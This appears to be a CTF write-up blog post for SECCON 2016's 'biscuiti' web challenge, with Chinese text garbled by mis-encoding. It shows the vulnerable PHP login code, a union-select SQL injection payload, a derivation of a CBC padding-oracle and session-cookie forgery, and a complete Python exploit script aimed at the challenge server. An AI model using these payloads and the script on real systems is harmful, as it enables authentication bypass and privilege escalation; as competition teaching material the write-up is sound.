<br/><img alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PCç«¯-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./Seccon-CTF-2016-biscuiti-writeup/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">è”ç³»æˆ‘</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>æ–‡ç« </span></div>
<div class="article-info-block">
        5
          <span>æ ‡ç­¾</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=æœ‰äº‹Qæˆ‘&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="secconctf2016biscuitiwriteup">Seccon-CTF-2016-biscuiti-writeup</h1>
<p style="max-width:100%;height:auto;">é™„dalaoé“¾æ¥ï¼šhttps://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/
å…¶ä»–é¢˜ç›®çš„wpå†™åœ¨å¦ä¸€ç¯‡æ–‡ç« é‡Œé¢ï¼šhttp://blog.csdn.net/qq_19876131/article/details/53675162</p>
<h1 id="web300biscuiti">web300 biscuiti</h1>
<p style="max-width:100%;height:auto;">è¿™é“é¢˜æˆ‘å•ç‹¬æŒ‘å‡ºæ¥å‘åšå®¢ï¼Œå› ä¸ºæŠ˜è…¾äº†æˆ‘å¿«ä¸€å¤©ï¼Œè€Œä¸”é‡åˆ°çš„é—®é¢˜éƒ½æ˜¯ç»å¯¹ä¸è¯¥çŠ¯çš„é”™è¯¯ï¼ŒçœŸæ˜¯æš´èºï¼Œä¸è¿‡é¢˜ç›®è´¨é‡æœ¬èº«è¿˜æ˜¯ç›¸å½“é«˜çš„ã€‚
ä¸€é“web+padding oracleçš„é¢˜ç›®ã€‚ä½†æ˜¯æˆ‘çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨è°ƒè‡ªå·±çš„è„šæœ¬ä¸Šäº†ï¼Œæš´éœ²å‡ºå¹³æ—¶å†™ä»£ç çš„ä¹ æƒ¯å¤ªå·®äº†ï¼Œå„ç§ç»†èŠ‚é—®é¢˜æ¥äºŒè¿ä¸‰ã€‚çœŸæ˜¯çˆ†ç‚¸</p>
<p style="max-width:100%;height:auto;">é¦–å…ˆæ‹¿åˆ°æºç ï¼Œæœ¬åœ°çš„sqliteç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œæ€ä¹ˆä¹Ÿè¿ä¸ä¸Šï¼Œæ‰€ä»¥ç®€å•æ”¹äº†æ”¹æ¢æˆäº†mysqlã€‚åº”è¯¥å½±å“ä¸å¤§å§ã€‚ã€‚å¤§æ¦‚ã€‚ã€‚ã€‚</p>
<p style="max-width:100%;height:auto;">ç®€å•æ”¹æˆmysqlæ•°æ®åº“åæºç å¦‚ä¸‹ï¼š</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
error_reporting(0);
define("ENC_KEY", "abcdcensoreddefg");
define("ENC_METHOD", "aes-128-cbc");
if (!extension_loaded(&amp;apos;pdo_sqlite&amp;apos;)) {
    header("Content-type: text/plain");
    echo "PDO Driver for SQLite is not installed.";
    exit;
}
if (!extension_loaded(&amp;apos;openssl&amp;apos;)) {
    header("Content-type: text/plain");
    echo "OpenSSL extension is not installed.";
    exit;
}
/*
Setup:
CREATE TABLE user (
username VARCHAR(255),
enc_password VARCHAR(255),
isadmin BOOLEAN
);
INSERT INTO user VALUES ("admin", "***censored***", 1);
*/
// åŠ å¯†ä¹‹åbase64
function auth($enc_password, $input) {
    $enc_password = base64_decode($enc_password);
    $iv = substr($enc_password, 0, 16);
    $c = substr($enc_password, 16);
    #echo $c."&lt;br&gt;".$v;
    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $input;
}
function mac($input) {
    $iv = str_repeat("\0", 16);
    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
    return substr($c, -16);
}
function save_session() {
    global $SESSION;
    $j = serialize($SESSION);
    $u = $j . mac($j);
    setcookie("JSESSION", base64_encode($u));
}
function load_session() {
    global $SESSION;
    if (!isset($_COOKIE["JSESSION"]))
        return array();
    $u = base64_decode($_COOKIE["JSESSION"]);
    $j = substr($u, 0, -16);
    $t = substr($u, -16);
    if (mac($j) !== $t)
        return array(2);
    $SESSION = unserialize($j);
    //a:3:{s:4:"name";s:9:"bendawang";s:7:"isadmin";s:1:"1";s:8:"password";s:27:"bendawangbendawangbendawang";}
}
function _h($s) {
    return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
}
function mysql_conn()
{
    $conn=@mysql_connect(&amp;apos;localhost&amp;apos;,&amp;apos;root&amp;apos;,&amp;apos;1&amp;apos;) or die(&amp;apos;could not connect&amp;apos;.mysql_error());
    mysql_query(&amp;apos;use test&amp;apos;);
    mysql_query("SET character_set_connection=utf8, character_set_results=utf8,character_set_client=utf8", $conn);
    return $conn;
}

function login_page($message = NULL) {
?&gt;&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;?php
    if (isset($message)) {
        echo "  &lt;div&gt;" . _h($message) . "&lt;/div&gt;\n";
    }
?&gt;
  &lt;form method="POST"&gt;
    &lt;div&gt;
      &lt;label&gt;username&lt;/label&gt;
      &lt;input type="text" name="username"&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;label&gt;password&lt;/label&gt;
      &lt;input type="password" name="password"&gt;
    &lt;/div&gt;
    &lt;input type="submit" value="login"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
      exit;
}
function info_page() {
    global $SESSION;
?&gt;&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;?php
    printf("Hello %s\n", _h($SESSION["name"]));
    if ($SESSION["isadmin"])
        echo &amp;apos;get flag!!&amp;apos;;
?&gt;
&lt;div&gt;&lt;a href="logout.php"&gt;Log out&lt;/a&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
      exit;
}
if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
    $username = (string)$_POST[&amp;apos;username&amp;apos;];
    $password = (string)$_POST[&amp;apos;password&amp;apos;];
    $dbh =mysql_conn();
    #echo "SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;";
    $result = mysql_query("SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;");
    if (!$result) {
        login_page("error");
        /* DEBUG
        $info = $dbh-&gt;errorInfo();
        login_page($info[2]);
        //*/
    }
    $u = mysql_fetch_array($result);
    if ($u &amp;&amp; auth($u["enc_password"], $password)) {
        $SESSION["name"] = $u[&amp;apos;username&amp;apos;];
        $SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];
        save_session();
        info_page();
    }
    else {
        login_page("error");
    }
}
else {
    load_session();
    if (isset($SESSION["name"])) {
        info_page();
    }
    else {
        login_page();
    }
}
</code></pre>
<p style="max-width:100%;height:auto;">åŠŸèƒ½å¤§æ¦‚æ€»ç»“ä¸‹ï¼š</p>
<ul>
<li>1ã€é¦–å…ˆå¦‚æœæ­£å¸¸ç™»é™†é€šè¿‡æŸ¥è¯¢<code style="max-width:100%;height:auto;">queryï¼ˆâ€œSELECT usernameï¼Œenc_password from user WHERE username =&amp;apos;{$ username}&amp;apos;â€ï¼‰</code>ä»æ•°æ®åº“æ£€ç´¢ç”¨æˆ·åå’Œç›¸åº”çš„åŠ å¯†å¯†ç ï¼Œå…¶ä¸­åŠ å¯†å¯†ç æ ¼å¼æ˜¯<code style="max-width:100%;height:auto;">IV||cipher</code></li>
<li>2ã€ç™»é™†ç»“æœæ˜¯<code style="max-width:100%;height:auto;">AES-128-CBC</code>è§£å¯†enc_passwordï¼Œç„¶åä¸è¾“å…¥è¿›è¡Œå¯¹æ¯”ã€‚ç™»é™†æˆåŠŸçš„è¯ä¼šåˆå§‹åŒ–<code style="max-width:100%;height:auto;">$SESSION</code>æ•°ç»„</li>
<li>3ã€<code style="max-width:100%;height:auto;">COOKIE</code>çš„æ ¼å¼ï¼Œ<ul>
<li><code style="max-width:100%;height:auto;">$j = serialize($SESSION)</code></li>
<li><code style="max-width:100%;height:auto;">JSESSION =base64_encode( $j || MAC($j) )</code></li>
<li>macå‡½æ•°æ˜¯ä»¥16ä¸ªç©ºå­—èŠ‚ä¸º<code style="max-width:100%;height:auto;">IV</code>åŠ å¯†è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿”å›åŠ å¯†ç»“æœçš„å16ä½ã€‚</li></ul></li>
<li>4ã€å½“<code style="max-width:100%;height:auto;">$SESSION[â€œisadminâ€]</code>ä¸ºçœŸçš„æ—¶å€™æˆ‘ä»¬ä¼šè·å–åˆ°<code style="max-width:100%;height:auto;">flag</code></li>
</ul>
<p style="max-width:100%;height:auto;">æ‰€ä»¥å¤§æ¦‚ç›®çš„ä¹Ÿå°±æ˜ç¡®äº†ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ä½¿å¾—æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">$SESSION[â€œisadminâ€]</code>çš„å€¼ä¸ºçœŸã€‚</p>
<h2 id="0x01sqli">0x01 å­˜åœ¨sqli</h2>
<p style="max-width:100%;height:auto;">é¦–å…ˆæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹åˆ°è¾“å…¥çš„ç‚¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¹Ÿå°±æ„å‘³ç€å­˜åœ¨sqlæ³¨å…¥ï¼Œå¹¶ä¸”ç™»é™†çš„æ—¶å€™æ˜¯ä¼šè§¦å‘è§£å¯†è¿‡ç¨‹çš„ï¼Œè€Œä¸”sqlæ³¨å…¥ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡è”åˆæ³¨å…¥æ§åˆ¶æŸ¥è¯¢è¿”å›çš„ç»“æœï¼Œè¿™ä¹Ÿå°±æ»¡è¶³padding oracleçš„æ¡ä»¶ã€‚
æ¯”å¦‚æˆ‘ä»¬è¾“å…¥å¦‚ä¸‹çš„å€¼ï¼š(è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„ç”¨æˆ·åé•¿åº¦ç›¸å½“é•¿ï¼Œå¾…ä¼šå„¿ä¼šè§£é‡Šä¸ºä»€ä¹ˆè¦è®¾å®šä¸ºè¿™ä¹ˆé•¿)</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">username=&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;bendawang&amp;password=
</code></pre>
<p style="max-width:100%;height:auto;">ä½¿å¾—<code style="max-width:100%;height:auto;">password</code>ä¸ºç©ºï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šè§¦å‘è§£å¯†è¿‡ç¨‹</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">function auth($enc_password, $input) {     //`$enc_password`å³ä½¿`bendawang`,è€Œ$inputåˆ™ä¸ºç©º
    $enc_password = base64_decode($enc_password);     
    $iv = substr($enc_password, 0, 16);
    $c = substr($enc_password, 16);
    #echo $c."&lt;br&gt;".$v;
    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);     //è§£å¯†å¤±è´¥ï¼Œè¿”å›ç©ºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶`IV`å’Œ`cipher`ï¼Œå­˜åœ¨`padding_oracle_attack`
    return $password == $input;    //ç”±äºè§£å¯†å¤±è´¥ï¼Œç©ºç­‰äºç©ºï¼ŒéªŒè¯é€šè¿‡ï¼ï¼ï¼
}
</code></pre>
<p style="max-width:100%;height:auto;">è¿™æ ·æˆ‘ä»¬å°±èƒ½æ­£å¸¸ç™»é™†ä¸Šå»ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•è·å–åˆ°<code style="max-width:100%;height:auto;">flag</code>ï¼Œå› ä¸ºè”åˆæŸ¥è¯¢æ— æ³•æ§åˆ¶<code style="max-width:100%;height:auto;">$SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];</code>
ä½†æ˜¯é€šè¿‡ä¸Šé¢çš„pocï¼Œæˆ‘ä»¬èƒ½å¤Ÿè·å–åˆ°ä¸€ä¸ªcookieå€¼ã€‚</p>
<p style="max-width:100%;height:auto;"><br/><img alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="0x02cookie">0x02 cookieå€¼</h2>
<p style="max-width:100%;height:auto;">ä¸‹é¢çš„å‡½æ•°æ˜¯å¯¹cookieå€¼çš„å¤„ç†ã€‚</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">function load_session() {
    global $SESSION;
    if (!isset($_COOKIE["JSESSION"]))
        return array();
    $u = base64_decode($_COOKIE["JSESSION"]);
    $j = substr($u, 0, -16);
    $t = substr($u, -16);
    if (mac($j) !== $t)
        return array(2);
    $SESSION = unserialize($j);
}
</code></pre>
<p style="max-width:100%;height:auto;">æ ¹æ®<code style="max-width:100%;height:auto;">0x01</code>æˆ‘ä»¬æ‹¿åˆ°çš„ä¸€ä¸ª<code style="max-width:100%;height:auto;">cookie</code>ï¼Œbase64è§£ç åå¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";N;}F
ÃÃœGÂƒ6RÂšÂÃ§Ã¨
</code></pre>
<p style="max-width:100%;height:auto;">æˆ‘ä»¬å·²çŸ¥çš„cookieå€¼çš„æ ¼å¼</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">$j = serialize($SESSION)
JSESSION =base64_encode( $j || MAC($j) )
</code></pre>
<h2 id="0x03">0x03 å¼€å§‹æäº‹</h2>
<p style="max-width:100%;height:auto;">ç°åœ¨ï¼Œæˆ‘ä»¬çš„ç›®çš„å·²ç»æ˜ç¡®äº†ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è·å–åˆ°å¯†é’¥çš„ï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±å†³å®šäº†æˆ‘ä»¬åªèƒ½é€šè¿‡å¦ä¸€ç§æ–¹å¼ä¿®æ”¹cookieçš„å€¼ç„¶åæäº¤ï¼Œä½¿å¾—éªŒè¯é€šè¿‡å¹¶ä¸”ä½¿<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>ã€‚
é¦–å…ˆæˆ‘ä»¬å·²çŸ¥ä»€ä¹ˆï¼Œå·²çŸ¥AESåŠ å¯†çš„æ—¶å€™å—çš„å¤§å°N=16ã€‚
æˆ‘ä»¬æœ‰ä¸€ä¸ªcookieå€¼ï¼Œå³æˆ‘ä»¬çŸ¥é“å…¨éƒ¨çš„æ˜æ–‡ä¸²ï¼Œè¿˜æœ‰æœ€åä¸€å—æ˜æ–‡è¢«åŠ å¯†çš„åˆ°çš„å¯†æ–‡å—
å…ˆæŠŠæ˜æ–‡åˆ†å—å¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">P0ï¼ša:2:{s:4:"name";     ----&gt; C0
P1ï¼šs:27:"bendawangb     ----&gt; C1
P2ï¼šendawangbendawan     ----&gt; C2
P3ï¼šg";s:7:"isadmin"     ----&gt; C3
P4ï¼š;N;}                 ----&gt; C4 ï¼ˆå·²çŸ¥ï¼Œcookieçš„æœ«16ä½ï¼‰
</code></pre>
<p style="max-width:100%;height:auto;">å¦‚ä¸Šå¦‚æ‰€ç¤ºï¼Œæˆ‘ä»¬å·²çŸ¥ä¸€å—çš„å¯†æ–‡ï¼ŒåŠ ä¸Šæ‰€æœ‰çš„æ˜æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code style="max-width:100%;height:auto;">padding_oracle</code>æ¢å¤æ‰€æœ‰çš„å¯†æ–‡å—ï¼Œç”±äºsqlæ³¨å…¥ç‚¹ï¼Œæˆ‘ä»¬å¯æ§ï¼Œæ—¢å¯ä»¥æ§åˆ¶è¢«è§£å¯†çš„å­—ç¬¦ä¸²ã€‚</p>
<blockquote>
<p style="max-width:100%;height:auto;">è¿™é‡Œä¸è®²padding<em>oracleçš„å…·ä½“åŸç†äº†ï¼Œéœ€è¦çš„ç«¥é‹å¯ä»¥çœ‹æˆ‘å†™çš„å¦ä¸€ç¯‡blogï¼šhttp://blog.csdn.net/qq</em>19876131/article/details/52674589
  æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é‚£é‡Œè¿›è¡Œ<code style="max-width:100%;height:auto;">padding_oracle_attack</code>ï¼Œç„¶åä»¥èƒ½å¦æˆåŠŸç™»é™†åˆ¤æ–­æ˜¯å¦è§£å¯†æˆåŠŸ(PS:è¾“å…¥çš„<code style="max-width:100%;height:auto;">password</code>è¦ä¸ºç©º)ï¼Œå¦‚æœè§£å¯†å¤±è´¥ï¼Œå°±èƒ½ç™»é™†æˆåŠŸï¼Œå¦åˆ™ç™»å½•å¤±è´¥ã€‚
  è¿™æ ·æˆ‘ä»¬æœ‰äº†å…¨éƒ¨çš„å¯†æ–‡å—ã€‚
  ç›¸å½“äºæˆ‘ä»¬å·²çŸ¥äº†å…¨éƒ¨çš„<code style="max-width:100%;height:auto;">P0-P4</code>å’Œ<code style="max-width:100%;height:auto;">C0-C4</code>
  ç°åœ¨è¿›å…¥åˆ°é‡å¤´æˆã€‚
  æ€ä¹ˆè¦ä½¿<code style="max-width:100%;height:auto;">P4</code>çš„å€¼ä»<code style="max-width:100%;height:auto;">P4 = ";N;}"</code>å˜æˆ<code style="max-width:100%;height:auto;">P4&amp;apos; = ";b:1;}"</code>ï¼Œå¹¶ä¸”ä¿®æ”¹<code style="max-width:100%;height:auto;">C4</code>ä¸ºå¤šå°‘çš„æ—¶å€™ï¼Œä½¿å…¶èƒ½å¤Ÿæ­£å¸¸è§£å¯†ï¼Œä»è€Œååºåˆ—åŒ–ä¹‹å<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>ã€‚</p>
</blockquote>
<p style="max-width:100%;height:auto;">å…ˆæ¥çœ‹çœ‹æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">P2</code>ï¼Œä¸çŸ¥é“å¤§å®¶çœ‹å‡ºæ¥æ²¡æœ‰ï¼Œæ•´ä¸ª<code style="max-width:100%;height:auto;">P2</code>å—éƒ½æ˜¯åŸåºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„å­—ç¬¦ä¸²æ ¼å¼çš„ä¸œè¥¿ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†æˆ‘ä»¬ä¸ºä»€ä¹ˆæœ€åˆç™»é™†çš„æ—¶å€™ç”¨æˆ·åè¦ç›¸å½“é•¿æ‰è¡Œã€‚è¿™æ ·å­æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">P2</code>æˆ‘ä»¬å¯ä»¥éšä¾¿ä¿®æ”¹ï¼Œåªè¦æœ€åèƒ½å¤Ÿæ­£å¸¸è§£å¯†ï¼Œé‚£ä¹ˆå®ƒéƒ½ä¸ä¼šå½±å“ååºåˆ—åŒ–çš„ç»“æœã€‚
è¿™é‡Œæˆ‘ä»¬å…ˆä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>çš„å€¼å¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1     //å¾…ä¼šå°±çŸ¥é“ä¸ºä»€ä¹ˆä¼šä¿®æ”¹æˆè¿™ä¸ªå€¼
</code></pre>
<p style="max-width:100%;height:auto;">ç„¶åæˆ‘ä»¬ä¿æŒå…¶ä»–åœ°æ–¹éƒ½ä¸å˜çš„è¯ï¼Œç„¶åé‡æ–°å‘é€è¯·æ±‚å¾—åˆ°æ–°çš„<code style="max-width:100%;height:auto;">cookie</code>å€¼ï¼ŒåŒæ ·é€šè¿‡<code style="max-width:100%;height:auto;">padding_oracle</code>æˆ‘ä»¬èƒ½å¤Ÿæ¢å¤å‡ºæ–°çš„<code style="max-width:100%;height:auto;">C2â€™</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆå®¹æ˜“èƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œç”¨æ–°çš„<code style="max-width:100%;height:auto;">P2&amp;apos;</code>åŠ å¯†ï¼Œä½†æ˜¯<code style="max-width:100%;height:auto;">C0</code>å’Œ<code style="max-width:100%;height:auto;">C1</code>æ˜¯ä¸ä¼šå˜åŒ–çš„ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬ä¸€å€¼<code style="max-width:100%;height:auto;">C2â€™</code>çš„å€¼æ˜¯æ€ä¹ˆå¾—æ¥çš„</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">ç”±äºæ˜¯CBCæ¨¡å¼
C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
ç”±ä¸Šå·²çŸ¥
P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1
æ‰€ä»¥
C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
    = Encrypto(P4&amp;apos; ^ C3 ^ C1 ^ C1)
    = Encrypto(P4&amp;apos; ^ C3 )
</code></pre>
<p style="max-width:100%;height:auto;">æœ‰äº†ä¸Šé¢çš„å¼å­ï¼Œæˆ‘ä»¬å†é‡æ–°æ¥ï¼Œè¿™æ¬¡ä¸ä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>äº†ï¼Œè¿™æ¬¡æˆ‘ä»¬åªä¿®æ”¹<code style="max-width:100%;height:auto;">P4</code>ä¸º<code style="max-width:100%;height:auto;">P4&amp;apos;</code></p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">ç”±äºæ˜¯CBCæ¨¡å¼
C4&amp;apos;=Encrypto( P4&amp;apos; ^ C3 )=C2&amp;apos;
</code></pre>
<p style="max-width:100%;height:auto;">æ‰€ä»¥è¿™å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬åªä¿®æ”¹<code style="max-width:100%;height:auto;">P4</code>å¯¹åº”æ–°çš„C4â€™å’Œåªä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>æ¢å¤å‡ºçš„<code style="max-width:100%;height:auto;">C2&amp;apos;</code>æ˜¯ç›¸ç­‰çš„ï¼Œé‚£ä¹ˆè¿™å°±æå®šäº†ã€‚</p>
<h2 id="0x04">0x04 ä»£ç </h2>
<p style="max-width:100%;height:auto;">å°±å‰©å†™ä»£ç ï¼Œä¸‹é¢é™„ä¸Šæˆ‘è‡ªå·±å†™çš„ä»£ç ï¼Œå†™çš„å¾ˆæŒ«ï¼Œè€Œä¸”ä¸­é—´çŠ¯äº†å„å¼å„æ ·å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯ï¼Œè¿˜æ˜¯è‡ªå·±çš„ä»£ç ä¹ æƒ¯å¤ªå·®äº†ï¼Œæ…¢æ…¢æ”¹æ­£æŠŠ</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
import requests
import base64
url=&amp;apos;http://biscuiti.pwn.seccon.jp/&amp;apos;
N=16
def inject(password):
    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
    result=requests.post(url,data=param)
    return result
def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)
def padding_oracle(N,cipher,plaintext):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=&amp;apos;a&amp;apos;*(16-i)+chr(j)+padding+cipher
            result=inject(base64.b64encode(chr(0)*16+c))
            if "Hello" not in result.content:
                get=chr(j^i)+get
                print get.encode(&amp;apos;hex&amp;apos;)
                break
    return xor(get,plaintext)

jsession=inject("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
serialize=jsession[:-16]
print serialize
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
l=len(p)
p[l-1]=pad(p[l-1],N)
c=[""]*l
c[l-1]=jsession[-16:]
for i in xrange(l-1,0,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])
#c=[&amp;apos;\x88\xbb|I1e\x1c\xb9u\xe4\x8e\x90\x08\xc1\xa9\x11&amp;apos;, &amp;apos;sd\x0c2\x13i\xac\xfd\x16\x9e\xa8\xc5?\x07/\xe5&amp;apos;, &amp;apos;&gt;\xbfZX\xda\x10\x99^\xd9\xa3\x15\xa9\\Q-\x9e&amp;apos;, &amp;apos;\xf5;\xc6\x1cn\x0f\xe5\x1bJ{\x08\x00\xbd\x8d\x17\x18&amp;apos;, &amp;apos;\xd0PP\xbfK\x8b:\x12\xaa\xa8Et\x83\x12T\xe7&amp;apos;]
p[4]=pad(&amp;apos;;b:1;}&amp;apos;,N)
p[2]=xor(xor(c[3],p[4]),c[1])
param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangb{new_p}g&amp;apos;,&amp;apos;bendawang".format(new_p=p[2]),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
result=requests.post(url,data=param)
#print p
jsession=result.headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
print c
c=[""]*l
serialize=jsession[:-16]
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
#print p
p[l-1]=pad(p[l-1],N)
c[l-1]=jsession[-16:]
for i in xrange(l-1,1,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])
print c
new_jsession=base64.b64encode(&amp;apos;a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";b:1;}&amp;apos;+c[2])
header = {"Cookie":"JSESSION="+new_jsession}
r = requests.post(url, headers=header)
print r.content
</code></pre>
<p style="max-width:100%;height:auto;">è¿è¡Œæˆªå›¾å¦‚ä¸‹ï¼š
<br/><img alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="æ”¶èµ·">ç›®å½•[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./Seccon-CTF-2016-biscuiti-writeup/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            CopyrightÂ©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          CopyrightÂ©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">Â Â Â <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./Seccon-CTF-2016-biscuiti-writeup/prism.js"></script>
